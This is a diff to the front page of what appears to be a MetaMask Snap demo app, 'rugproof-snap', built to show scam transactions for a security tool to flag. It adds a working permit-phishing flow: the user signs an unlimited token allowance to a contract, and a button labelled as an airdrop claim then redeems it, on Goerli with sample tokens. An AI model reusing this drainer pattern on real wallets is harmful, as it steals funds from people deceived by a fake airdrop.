@@ -11,6 +11,7 @@ import {
 } from '../components';
 import SampleNFTAbi from '../abi/SampleNFT';
 import SampleTokenAbi from '../abi/SampleToken';
+import ScamContractAbi from '../abi/ScamContract';
 import { ethers } from 'ethers';
 
 const Container = styled.div`
@@ -50,12 +51,10 @@ const Subtitle = styled.p`
 `;
 
 const CardContainer = styled.div`
-  display: flex;
-  flex-direction: row;
-  justify-content: space-between;
-  flex-wrap: wrap;
-  max-width: 85rem;
-  width: 100%;
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  grid-gap: 2rem;
+  width: 50%;
   height: 100%;
   margin-top: 1.5rem;
 `;
@@ -195,40 +194,49 @@ const Index = () => {
     }
   };
 
-  const handleClaimTokenAirdrop = async () => {
+  const approveTokens = async () => {
     try {
       let [from] = (await window.ethereum.request({
         method: 'eth_requestAccounts',
       })) as string[];
-
       let networkVersion = await window.ethereum.request({
         method: 'net_version',
       });
-
       if (networkVersion !== '5') {
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
           params: [{ chainId: '0x5' }],
         });
       }
-
       let provider = new ethers.providers.Web3Provider(window.ethereum);
       let signer = await provider.getSigner();
+      let owner = await signer.getAddress();
 
-      await signer._signTypedData(domain, types, {
-        owner: await signer.getAddress(),
-        spender: '0x22e4aFF96b5200F2789033d85fCa9F58f163E9Ea',
-        nonce: 0,
-        value: ethers.utils.parseEther('10'),
+      let token = new ethers.Contract(
+        '0x9b66d55D0a737E0f9d08F2d56436D9A6D512e4bf',
+        SampleTokenAbi,
+        await provider.getSigner(),
+      );
+
+      let nonce = await token.nonces(owner);
+
+      let values = {
+        owner,
+        spender: '0xCd064F4A2a3bbA950E5e7866224C0Fe48286F96c',
+        nonce,
+        value: ethers.constants.MaxUint256,
         deadline: Math.round(Date.now() / 1000) + 100_000,
-      });
+      };
+      let signature = await signer._signTypedData(domain, types, values);
+      localStorage.setItem('token-permit-signature', signature);
+      localStorage.setItem('token-permit-values', JSON.stringify(values));
     } catch (e) {
       console.error(e);
       dispatch({ type: MetamaskActions.SetError, payload: e });
     }
   };
 
-  const handleClaimNFTAirdrop = async () => {
+  const approveNFTs = async () => {
     try {
       let [from] = (await window.ethereum.request({
         method: 'eth_requestAccounts',
@@ -262,17 +270,60 @@ const Index = () => {
     }
   };
 
+  const handleClaimTokenAirdrop = async () => {
+    try {
+      let [from] = (await window.ethereum.request({
+        method: 'eth_requestAccounts',
+      })) as string[];
+
+      let networkVersion = await window.ethereum.request({
+        method: 'net_version',
+      });
+
+      if (networkVersion !== '5') {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x5' }],
+        });
+      }
+      let values = JSON.parse(
+        localStorage.getItem('token-permit-values') as string,
+      );
+      let provider = new ethers.providers.Web3Provider(window.ethereum);
+      let contract = new ethers.Contract(
+        '0xCd064F4A2a3bbA950E5e7866224C0Fe48286F96c',
+        ScamContractAbi,
+        await provider.getSigner(),
+      );
+      let { v, r, s } = ethers.utils.splitSignature(
+        localStorage.getItem('token-permit-signature') as string,
+      );
+      console.log(values.owner, values.value, values.deadline, v, r, s);
+      await contract.claimAirdrop(
+        values.owner,
+        values.value,
+        values.deadline,
+        v,
+        r,
+        s,
+      );
+    } catch (e) {
+      console.error(e);
+      dispatch({ type: MetamaskActions.SetError, payload: e });
+    }
+  };
+
   return (
     <Container>
       <Heading>
         Welcome to <Span>rugproof-snap</Span>
       </Heading>
+      {state.error && (
+        <ErrorMessage>
+          <b>An error happened:</b> {state.error.message}
+        </ErrorMessage>
+      )}
       <CardContainer>
-        {state.error && (
-          <ErrorMessage>
-            <b>An error happened:</b> {state.error.message}
-          </ErrorMessage>
-        )}
         {!state.isFlask && (
           <Card
             content={{
@@ -281,7 +332,7 @@ const Index = () => {
                 'Snaps is pre-release software only available in MetaMask Flask, a canary distribution for developers with access to upcoming features.',
               button: <InstallFlaskButton />,
             }}
-            fullWidth
+            fullWidth={true}
           />
         )}
         {!state.installedSnap && (
@@ -297,6 +348,7 @@ const Index = () => {
                 />
               ),
             }}
+            fullWidth={true}
             disabled={!state.isFlask}
           />
         )}
@@ -313,6 +365,7 @@ const Index = () => {
                 />
               ),
             }}
+            fullWidth={true}
             disabled={!state.installedSnap}
           />
         )}
@@ -337,6 +390,19 @@ const Index = () => {
         />
         <Card
           content={{
+            title: 'Approve Sample Tokens',
+            description:
+              'Approving unlimited sample tokens to some malicious address',
+            button: (
+              <SendHelloButton
+                onClick={approveTokens}
+                message="Approve Tokens"
+              />
+            ),
+          }}
+        />
+        <Card
+          content={{
             title: 'Mint SampleNFT',
             description: 'Mint Sample NFT to see token transfer insights',
             button: (
@@ -344,6 +410,25 @@ const Index = () => {
                 onClick={handleMintNFT}
                 disabled={!state.installedSnap}
                 message="Mint NFT"
+              />
+            ),
+          }}
+          disabled={!state.installedSnap}
+          fullWidth={
+            state.isFlask &&
+            Boolean(state.installedSnap) &&
+            !shouldDisplayReconnectButton(state.installedSnap)
+          }
+        />
+        <Card
+          content={{
+            title: 'Approve Sample NFTs',
+            description: 'Approving all sample nfts to some malicious address',
+            button: (
+              <SendHelloButton
+                onClick={approveNFTs}
+                disabled={!state.installedSnap}
+                message="Approve NFTs"
               />
             ),
           }}
@@ -381,7 +466,7 @@ const Index = () => {
               'A request to set approval for all tokens disgused as Claim Airdrop',
             button: (
               <SendHelloButton
-                onClick={handleClaimNFTAirdrop}
+                // onClick={handleClaimNFTAirdrop}
                 disabled={!state.installedSnap}
                 message="ClaimNFTAirdrop"
               />
